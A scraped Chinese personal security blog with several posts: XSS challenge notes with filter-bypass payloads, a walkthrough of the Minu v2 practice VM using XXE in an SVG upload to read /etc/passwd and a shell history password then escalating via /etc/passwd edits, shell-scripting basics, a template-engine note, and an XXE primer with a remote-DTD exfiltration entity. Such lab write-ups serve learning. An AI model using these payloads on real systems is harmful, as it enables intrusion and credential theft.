class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">         input.name = i;</span><br><span class="line">         input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">     &lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">     // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">     if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">     document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">     else                                                  \n\</span></span><br><span class="line"><span class="string">          document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">     &lt;/script&gt;                                                    \n\</span></span><br><span class="line"><span class="string">     '</span>;</span><br><span class="line">     &#125;  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>javascript中出现同名属性和子tag时，使用.访问子tag更优先。这里通过构造子input标签的方法来绕过waf。<br>而这里document.form[0].action可能会访问form表单的第一个名为action的input标签从而绕过过滤。</p>
<h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload 6"></a>payload 6</h4><p> javascript:prompt(1)#{“action”,”xxx”}</p>
</li>
<li><p>javascript的一些危险函数</p>
</li>
</ol>
<ul>
<li><p>replace()函数，主要是使用特殊字符串作为第二个参数的时候。</p>
<p>  reference: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p>
<p><img src="https://i.loli.net/2019/09/21/HtfpXK2sWg7b3Ej.png" alt="image.png"></p>
</li>
<li><p>toUpperCase()函数,这个函数可能会将一些unicode 转为大写或者小写的ascii字母。<br><br>305 Original : ı [\u131] LowerCase :  UpperCase : I<br><br>383 Original : ſ [\u17f] LowerCase :  UpperCase : S<br><br>8490 Original : K [\u212a] LowerCase : k UpperCase : <br><br>64261 Original : ﬅ [\ufb05] LowerCase :  UpperCase : ST<br><br>64262 Original : ﬆ [\ufb06] LowerCase :  UpperCase : ST<br></p>
</li>
</ul>
<ol start="3">
<li>javascript的原型继承问题<br>javascipt通过成员访问函数访问属性时，如果查找不到，就会沿着继承链向上查找，其中所有的javascript对象都会继承一个叫<strong>proto</strong>的对象。可以通过修改<strong>proto</strong>对象的属性来达到某些目的。例如13关的waf当检查到不安全属性时，就会删除该属性。但如果通过原型链污染的方法来，将这个属性添加在原型中，使对象再次被访问时，获取原型的同名属性值来绕过waf。</li>
<li>javascript的代码报错执行函数。<br><br>((prompt(1)))instanceof”” <br><br>((prompt(1)))in”” 会先执行左边的表达式然后再执行in或者instanceof表达式从而执行函数。<h3 id="其他的小tricks"><a href="#其他的小tricks" class="headerlink" title="其他的小tricks"></a>其他的小tricks</h3></li>
<li>解析url时碰到@的时候会将后面的资源一并加载进来。</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>感觉xss还是挺灵活的，各种payload用到了不少知识，挺值得进一步研究的。</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/09/21/xss练习小结/" data-id="ck2jra66t000gfbtlu8xo59zm" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Minuv2靶机渗透实战" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/11/Minuv2靶机渗透实战/" class="article-date">
  <time datetime="2019-09-11T13:03:24.000Z" itemprop="datePublished">2019-09-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/11/Minuv2靶机渗透实战/">Minuv2靶机渗透实战</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>##前言</p>
<p>&emsp;&emsp;这个靶机是暑假中间的时候找到的，做下来主要的感觉就是还是偏信息收集这块，基本上没有什么需要高技巧的操作，然而我还是，，，果然还是缺乏经验。</p>
<p>##环境以及工具介绍</p>
<p>&emsp;&emsp;虚拟机parallers，本机macOS ip 10.211.55.2，kali攻击机 ip 10.211.55.4，靶机 ip 10.211.55.14，kali和靶机均设置为共享网络模式。<br>抓包工具bp，浏览器firefox。</p>
<p>##流程介绍</p>
<h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><ul>
<li><p>首先是要找到靶机的ip和开放的端口，这里直接用nmap去扫。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sP 10.211.55.0/24</span><br><span class="line">nmap -A 10.211.55.14</span><br></pre></td></tr></table></figure>

<p>10.211.55.2是本机，10.211.55.14应该就是靶机，然后把所有脚本跑一遍，发现开启了两个口一个是22另外一个是3306。<br><img src="https://i.loli.net/2019/09/11/4lMjswWDRgckp6T.png" alt="image.png"> </p>
</li>
<li><p>linux版本3以上</p>
</li>
<li><p>22毫无疑问是ssh服务，然而这个3306端口似乎并不是mysql服务，我试试直接访问。<br><img src="https://i.loli.net/2019/09/11/DtpY3o5nJegcyTS.png" alt="image.png"><br>看起来是web服务。</p>
</li>
<li><p>拿dirsearch跑下看看有什么发现。发现上传页面upload.html，要求上传svg文件。猜测一波可能有文件上传漏洞。</p>
</li>
<li><p>看了下http包的header。发现有 <b>X-Powered-By<br>Kemal</b>这串数据，查找治疗后后发现是一个国外的轻量级web框架。<br>不是php开发的。<a href="https://github.com/kemalcr/kemal" target="_blank" rel="noopener">https://github.com/kemalcr/kemal</a></p>
</li>
</ul>
<h3 id="2-试图获取webshell"><a href="#2-试图获取webshell" class="headerlink" title="2.试图获取webshell"></a>2.试图获取webshell</h3><ul>
<li>随便找了张图片转成了svg上传抓包，发现svg是由xml构成的，临时打算试了下xml的实体解析漏洞，尝试读取/etc/passwd。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"</span></span><br><span class="line"><span class="meta"> "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">width</span>=<span class="string">"1305.600000pt"</span> <span class="attr">height</span>=<span class="string">"1094.400000pt"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 1305.600000 1094.400000"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">preserveAspectRatio</span>=<span class="string">"xMidYMid meet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">metadata</span>&gt;</span></span><br><span class="line">Created by potrace 1.13, written by Peter Selinger 2001-2015</span><br><span class="line"><span class="tag">&lt;/<span class="name">metadata</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">g</span> <span class="attr">transform</span>=<span class="string">"translate(0.000000,1094.400000) scale(0.080000,-0.080000)"</span></span></span><br><span class="line"><span class="tag"><span class="attr">fill</span>=<span class="string">"#000000"</span> <span class="attr">stroke</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>响应<br><img src="https://i.loli.net/2019/09/11/iXWuTGrNEUnxyFl.png" alt="image.png"><br>这里确定了就是信息泄露了。整理下了，发现能用的就这些。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">employee:x:1000:1000:Linux User,,,:/home/employee:/bin/ash</span><br><span class="line">postgres:x:70:70::/var/lib/postgresql:/bin/sh</span><br></pre></td></tr></table></figure>

<p>基本上可登录的用户就两个，一个是root，另外一个是employee，感觉可以尝试获取employee的密码后登录，然后再获取超级账号。在这个思路指导下，我还尝试了/etc/shadow，/etc/hosts等文件，基本上没有什么收货。</p>
<ul>
<li>尝试读取employee的命令行记录，由于知道employee的shell是ash所以，尝试获取.ash_history。获取密码superultrapass3。然后成功登陆系统。</li>
<li>uname -a 查看操作系统的版本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux minuv2 4.19.58-0-virt #1-Alpine SMP Wed Jul 10 13:00:23 UTC 2019 x86_64 Linux</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>感觉内核不是特别老，exploit db上也没找到相关的信息，感觉不是直接提权。</p>
<ul>
<li>通过which命令发现机子上并没有，pyhton和php环境，连/dev/tcp也没有，但发现有perl，可以连一句话。但这里好像也没什么用了。</li>
<li>没有sudo，su可用，基本上除了根目录就没什么能写能看的文件。</li>
</ul>
<h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h3><p>&emsp;&emsp;提权的时候，大概有这么几种思路：</p>
<ol>
<li><p>内核提权，这个需要结合靶机的内核和靶机的环境，比如dirtycrow就只能在3.1到3.78版本的内核上用</p>
</li>
<li><p>攻击以管理员权限运行的服务，比如httpd，mysql等等，利用root权限运行的服务，尝试获取root shell。</p>
</li>
<li><p>suid代表设置用户id，linux通过suid机制使非指定用户使用某些指定用户才能使用的功能。例如ping命令需要用root权限打开原始套接字，而ping命令有suid所以普通用户也可以使用ping命令。我们可以通过一些拥有root权限的程序获取root shell，或者对现有文件做一些更改，比如/etc/passwd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用sudo权限<br>等等</p>
</li>
</ol>
<p>&emsp;&emsp;这里我发现可以用micro编辑器修改文件，从而获取和root同样分组的用户<br><img src="https://i.loli.net/2019/09/12/8C1tsA2SPrZXc3u.png" alt="image.png"><br>这里可以添加新用户或者直接修改employee的权限，但要注意，最后一行记录后需要换行，不然会出现can’t use /bin/as这个错误。<br><img src="https://i.loli.net/2019/09/12/aheb3JN4WBHKoQO.png" alt="image.png"></p>
<p>最后cd /root 获取flag.txt</p>
<p><img src="https://i.loli.net/2019/09/12/rOXPFQnUHpzAEhT.png" alt="image.png"></p>
<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>&emsp;&emsp;这个靶机其实还算是简单，但是由于不是特别熟悉思路，还是花了好久才做出来。那个查当前用户的命令记录还真的没想到。怎么说呢，还是一个思路广度和对资料利用的问题，好多地方都是最后差了一点。</p>
<p>Reference: </p>
<ul>
<li><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/" target="_blank" rel="noopener">https://www.xmsec.cc/guide-linux-privilege-escalation/</a> 这篇关于提权的博客很好</li>
<li><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a> 一句话shell的资料</li>
<li><a href="https://www.cnblogs.com/hack404/p/11350499.html" target="_blank" rel="noopener">https://www.cnblogs.com/hack404/p/11350499.html</a> wp</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/09/11/Minuv2靶机渗透实战/" data-id="ck2jra66e0001fbtllcrr2dil" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-shell编程基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/02/shell编程基础/" class="article-date">
  <time datetime="2019-09-02T12:18:55.000Z" itemprop="datePublished">2019-09-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/02/shell编程基础/">shell编程基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;花了两天看了下shell编程的一些内容，结合以前记得笔记做个小结。linux的shell编程主要是用于维护服务器操作的自动化，从安装软件，到启动服务，都可以使用脚本来完成。</p>
<p>&emsp;&emsp;linux下的shell有很多种，但我们主要用的是bash</p>
<p>&emsp;&emsp;感觉下来，shell的一些优势：</p>
<ol>
<li>不需要额外的环境，linux自带bash。</li>
<li>完成简单的操作需要的代码量较少。</li>
<li>和原生程序交互比较方便。比如处理文本的时候需要用到的awk和sed，熟练使用后比较方便。</li>
</ol>
<h2 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h2><h3 id="1-bash内置变量和常见表达式"><a href="#1-bash内置变量和常见表达式" class="headerlink" title="1. bash内置变量和常见表达式"></a>1. bash内置变量和常见表达式</h3><ul>
<li>命令行参数（非指定）, 对于脚本参数，和自定义函数参数而言，$0代表脚本本身的名字，$1到$9代表1到9个参数，从第10个参数开始需要用${n}来表示变量。</li>
<li>常见的符号。$，取变量的值，${}和$()分别代表在在本身的shell中执行命令和在子shell中执行命令。{}还有分割变量与文本的左右例如$varAA就会报错，需要携程${var}AA的形式。</li>
<li>扩展运算，$[cmd],$((cmd))进行数字运算，`expr x operator y`也可能达到相同的效果。</li>
<li>&gt;&gt;和&lt;&lt; 重定向，|管道。</li>
<li>定义数组 var=()，生成a到z的list，var=({a..z})</li>
<li>更多表达式参考 <a href="https://www.cnblogs.com/farwish/p/4806018.html" target="_blank" rel="noopener">https://www.cnblogs.com/farwish/p/4806018.html</a></li>
</ul>
<h3 id="2-bash中的过程控制"><a href="#2-bash中的过程控制" class="headerlink" title="2. bash中的过程控制"></a>2. bash中的过程控制</h3><ul>
<li><p>分支选择<br>if分支选择语法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if [ cond ]; then</span><br><span class="line">  cmd</span><br><span class="line">elif [ cond ];then</span><br><span class="line">  cmd</span><br><span class="line">else</span><br><span class="line">  cmd</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>cond 可用test命令<br>例如 test -e /etc/passwd 或者 []代替test [ -e /etc/passwd ]</p>
</li>
</ul>
<p>  选择分支语法<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case word in</span><br><span class="line">    [ [(] pattern [| pattern]…) command-list ;;]…</span><br><span class="line">esac</span><br></pre></td></tr></table></figure></p>
<p>  举例<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo -n "Enter the name of an animal: "</span><br><span class="line">read ANIMAL</span><br><span class="line">echo -n "The $ANIMAL has "</span><br><span class="line">case $ANIMAL in</span><br><span class="line">    horse | dog | cat) echo -n "four";;</span><br><span class="line">    man | kangaroo ) echo -n "two";;</span><br><span class="line">    *) echo -n "an unknown number of";;</span><br><span class="line">esac</span><br><span class="line">echo " legs."</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>循环<br>for循环</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for var in list;</span><br><span class="line">do</span><br><span class="line">  cmds;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for((exp1;exp2;exp3));</span><br><span class="line">do</span><br><span class="line">  cmds;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>while循环和until循环</p>
<p>语法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while \ until [ test cmd ]; do cmds;done</span><br></pre></td></tr></table></figure>

<p>while和until的唯一区别是until的退出条件是test命令返回1 也就是不成立循环，而while循环则相反</p>
</li>
</ul>
<h3 id="3-处理字符串"><a href="#3-处理字符串" class="headerlink" title="3. 处理字符串"></a>3. 处理字符串</h3><ol>
<li>shell内置处理字符串，准确说shell中有两种处理字符串的方式。一种是${var:start:length},另外一种则是通过通配符的方式掐头去尾。</li>
</ol>
<ul>
<li>例如 ${var%%$SUBSTR}，最长匹配去尾</li>
<li>${var##$SUBSTR}，最长匹配去头</li>
<li>${var\$old\$new} 将旧的字符串替换为新的字符串（第一个） \\全部替换,#匹配开头，%匹配结尾</li>
</ul>
<ol start="2">
<li>cut命令 cut -f 1,7 -d ‘分隔符’ 去第一块和第七块</li>
<li>awk -F ‘分隔符’ ‘条件{action}’ 文本</li>
<li>sed</li>
</ol>
<h3 id="4-一些实例"><a href="#4-一些实例" class="headerlink" title="4. 一些实例"></a>4. 一些实例</h3><p>1) 随机函数<br>array[@]或者array[*]取数组所有的变量，数组下标从1开始。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">get_random()&#123;</span><br><span class="line">    length=$1</span><br><span class="line">    payload=(&#123;a..z&#125;)</span><br><span class="line">    payload+=(&#123;0..9&#125;)</span><br><span class="line">    l=$&#123;#payload[@]&#125;</span><br><span class="line">    result=''</span><br><span class="line">    for((i=0;$i&lt;$length;i++))</span><br><span class="line">    do</span><br><span class="line">        r=$[$RANDOM%$l]</span><br><span class="line">        result=$result$&#123;payload[$r-1]&#125;</span><br><span class="line">    done</span><br><span class="line">    printf "\n"</span><br><span class="line">    echo $result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in `seq 1 20`</span><br><span class="line">do</span><br><span class="line">    </span><br><span class="line">    result=$(get_random 6)</span><br><span class="line">    echo $result</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>2) 统计每个ip的访问量并按从大到小排序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line"></span><br><span class="line">path=$HOME</span><br><span class="line">now=$(date +%Y%m%d)</span><br><span class="line">echo $(ps aux | awk '&#123;if($1 in map)&#123;map[$1]+=1&#125;else&#123;map[$1]=1&#125;&#125; END&#123;for(x in map)&#123;printf("用户名：%-20s\t\t进程数：%d\r",x,map[x]) &#125;&#125;')&gt;&gt;$path/$now.log</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/09/02/shell编程基础/" data-id="ck2jra6690000fbtlosu59lyy" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell/">shell</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-简易python模板引擎其一" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/20/简易python模板引擎其一/" class="article-date">
  <time datetime="2019-08-20T12:03:47.000Z" itemprop="datePublished">2019-08-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/20/简易python模板引擎其一/">简易python模板引擎其一</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;发现一个叫500lines的项目感觉不错，看着自己动手实现一下，这是模板引擎项目的第一篇文章</p>
<h2 id="项目需求介绍"><a href="#项目需求介绍" class="headerlink" title="项目需求介绍"></a>项目需求介绍</h2><p>&emsp;&emsp;简单得讲一下，这个模板引擎参考了Django的一些语法，主要实现了以下一些内容</p>
<ul>
<li> 解析并打印变量的值</li>
<li>&lt;!–￼2–&gt;和带有内容提取出来转化为html文本，但实际上手感觉还是有不少问题。尤其是循环语句的处理，需要首先将其转为代码，然后再通过程序控制循环内内容的实现。这个项目的核心思路就是找到一种将代码和静态文本混杂的原始文本转化为代码或者纯静态文本。</li>
</ul>
<p>&emsp;&emsp;for,if与endfor，endif的闭合可以用栈来处理，参考左右括号的闭合验证。</p>
<p>&emsp;&emsp;取属性操作可以替换成相应的方法，而过滤器则需要解析成相应方法并逐级嵌套。</p>
<p>&emsp;&emsp;需要建立一套变量处理机制，尤其是区分局部变量和全局变量，全局变量应该从外部传入。</p>
<h3 id="python中的一些小窍门"><a href="#python中的一些小窍门" class="headerlink" title="python中的一些小窍门"></a>python中的一些小窍门</h3><ol>
<li><p>python中有一个类型叫做function对象类型，function对象可以作为参数，返回值和其他对象以相同的方式使用。<br>这里应用500lines说明文档中的原话。</p>
<p><code>In Python, a method call on an object like result.append(&quot;hello&quot;) is executed in two steps. First, the append attribute is fetched from the result object: result.append. Then the value fetched is invoked as a function, passing it the argument &quot;hello&quot;.</code></p>
<p>意思是我们调用一个python方法的时候可以将这个python方法保存为一个python对象，然后多次传入参数来执行函数。这个项目中主要用来简化生成代码流程。类似于result_append=result.append，调用时result_append(‘hello’)，将hello添加到结果代码的集合，待后期处理。</p>
</li>
<li><p>getattr方法可以用来获取对象中的属性</p>
</li>
<li><p>exec方法可以动态执行python代码并可以获取参与运行的全局变量</p>
</li>
</ol>
<h2 id="总结与提高"><a href="#总结与提高" class="headerlink" title="总结与提高"></a>总结与提高</h2><p>&emsp;&emsp;已经完成除了解析注释以外的功能，但觉得还是对python的面向对象理解不充分，尤其是将解析实现全部放在构造器里，对各个类的属性抽取不充分等等。下一版将作出改进。</p>
<p>&emsp;&emsp;希望能程序能支持，模板继承，自定义标签，还有elif，else等更复杂的逻辑。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/08/20/简易python模板引擎其一/" data-id="ck2jra66v000jfbtlipkg1g7y" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/500lines/">500lines</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-xxe注入入门" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/11/xxe注入入门/" class="article-date">
  <time datetime="2019-08-11T08:52:31.000Z" itemprop="datePublished">2019-08-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/11/xxe注入入门/">xxe注入入门</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这段时间学习了下xxe注入的一些知识，这里做下总结</p>
<h2 id="xml语言和xxe介绍"><a href="#xml语言和xxe介绍" class="headerlink" title="xml语言和xxe介绍"></a>xml语言和xxe介绍</h2><p>&emsp;&emsp;xml是一种类似html但对闭合要求更严格的标记符号语言，主要用于数据传输。</p>
<p>&emsp;&emsp;下面是一段xml的实例</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span><span class="comment">&lt;!--声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///sys/power/image_size"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个文档有以下几部分，文档声明，文档定义，文档元素,第一部分是声明，之后跟着的是文档定义，<b>&lt;!DOCTYPE 文档名 [内容]&gt;</b>，文档定义中嵌套实体，文档定义内可以嵌套实体定义，格式如下，<b>&lt;!ENTITY 实体名 “内容”&gt;</b>。定义结束后由文档定义的元素作为该文档的根元素，之后的所有元素需要正确嵌套入根元素内。</p>
<p>&emsp;&emsp;xml的实体共有五种，这里我们需要注意的主要有三种：</p>
<ol>
<li><p>外部实体，区别主要是是在实体名后如果跟着SYSTEM关键词，关键词后面跟着的外部文件的url，而外部实体的内容则是引用文件内的内容，可以通过&amp;实体名;的形式来引用实体。</p>
</li>
<li><p>内部实体 ，主要指的是在实体中嵌套另外一个实体，类似<br>于</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % param1 '&lt;!ENTITY  &amp;#37;  xxe SYSTEM "http://xxx.dtd? &amp;#37; payload;" &gt;'</span><br></pre></td></tr></table></figure>

<p>需要注意的是被嵌套实体中的 % ,&lt; 等字符需要进行html实体编码，16或者8进制皆可。</p>
</li>
<li><p>参数实体，类似于</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">f1</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">C:</span>/<span class="attr">phpStudy</span>/<span class="attr">PHPTutorial</span>/<span class="attr">WWW</span>/<span class="attr">1.txt</span>"&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">10.211.55.10</span>/<span class="attr">eval.dtd</span>"&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<p>参数实体的声明时的实体名前有%关键字，而引用时应用%实体名;来引用。</p>
</li>
</ol>
<p>&emsp;&emsp;xxe，xxe指的是外部实体注入，上面的实体定义不仅可以定义内部实体，也可以定义外部实体，引用远端的xml中定义的实体，并解析。并且可以根据不同的协议扩展为ssrf,任意命令执行，任意文件读取，ddos等等。</p>
<h2 id="xxe注入演示"><a href="#xxe注入演示" class="headerlink" title="xxe注入演示"></a>xxe注入演示</h2><h3 id="实验环境交代"><a href="#实验环境交代" class="headerlink" title="实验环境交代"></a>实验环境交代</h3><p>windows server 2008 r2 phpStudy php 5.3.29 libxml 2.7.8（libxml 2.9.4以及以上版本无效）</p>
<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><ul>
<li>reference: <a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab</a> 中的php_xxe</li>
</ul>
<p>关键代码如下</p>
